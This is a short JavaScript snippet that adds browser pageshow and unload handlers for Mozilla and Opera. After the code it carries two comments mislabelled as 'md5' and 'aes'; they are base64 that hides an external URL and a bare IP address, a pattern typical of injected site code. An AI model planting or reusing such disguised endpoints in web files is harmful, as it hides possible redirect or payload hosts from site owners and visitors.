if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuY3hmdnFvci5jb20vP3F1ZGFvPTdhOTZhNzQ5LTczOGQtNGE4YS00ZGE1LTMwNDY3Njk2NWEwNA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/